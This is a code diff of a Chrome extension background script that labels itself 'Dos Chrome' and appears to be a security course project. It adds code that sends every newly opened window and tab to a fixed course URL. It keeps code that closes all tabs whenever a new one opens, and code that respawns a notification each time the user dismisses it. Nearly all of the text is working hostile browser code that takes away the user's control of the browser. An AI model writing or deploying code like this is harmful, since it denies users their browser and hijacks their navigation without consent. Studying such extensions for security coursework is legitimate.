@@ -1,8 +1,3 @@
-var notificationBool = false;
-var fontBool = false;
-var powerBool = false;
-var closeBool = false;
-
 var createNotification = function() {
     chrome.notifications.create('chroak', {
         type: 'basic',
@@ -13,19 +8,25 @@ var createNotification = function() {
      }, function(notificationId) {});
 }
 
+if (JSON.parse(localStorage.getItem('notificationBool'))) {
+  createNotification();
+}
 chrome.notifications.onClosed.addListener(function(notifId, byUser){
-  if (notificationBool) {
+  if (JSON.parse(localStorage.getItem('notificationBool'))) {
     createNotification();
   }
 });
 
 /*
  * Dos Chrome -- Close windows and tabs as soon as they open.
+ * Reroute all new windows and tabs to an arbitrary website.
  */
-console.log('background process running');
 chrome.windows.onCreated.addListener(function(event) {
   console.log('opened a new window');
-  if (closeBool) {
+  if (JSON.parse(localStorage.getItem('rerouteBool'))) {
+    chrome.tabs.update(event.id, {url: 'http://courses.csail.mit.edu/6.857/2016/'});
+  }
+  if (JSON.parse(localStorage.getItem('closeBool'))) {
     chrome.tabs.query({}, function(tabs) {
       tabs.forEach(function(tab) {
         chrome.tabs.remove(tab.id);
@@ -36,7 +37,10 @@ chrome.windows.onCreated.addListener(function(event) {
 
 chrome.tabs.onCreated.addListener(function(event) {
   console.log('opened a new tab');
-  if (closeBool) {
+  if (JSON.parse(localStorage.getItem('rerouteBool'))) {
+    chrome.tabs.update(event.id, {url: 'http://courses.csail.mit.edu/6.857/2016/'});
+  }
+  if (JSON.parse(localStorage.getItem('closeBool'))) {
     chrome.tabs.query({}, function(tabs) {
       tabs.forEach(function(tab) {
         chrome.tabs.remove(tab.id);
